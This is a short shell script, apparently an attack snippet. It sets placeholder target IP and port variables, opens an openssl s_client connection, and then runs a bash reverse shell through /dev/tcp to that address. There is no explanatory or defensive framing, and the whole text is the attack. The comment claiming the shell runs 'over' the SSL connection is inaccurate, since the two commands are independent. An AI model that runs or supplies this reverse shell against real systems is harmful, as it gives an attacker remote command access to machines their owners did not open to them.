# Set the target IP address and port
IP_ADDRESS=TARGET_IP_ADDRESS
PORT=TARGET_PORT

# Use openssl to create an SSL connection to the target IP and port
openssl s_client -quiet -connect $IP_ADDRESS:$PORT

# Execute a bash shell over the connection
bash -i >& /dev/tcp/$IP_ADDRESS/$PORT 0>&1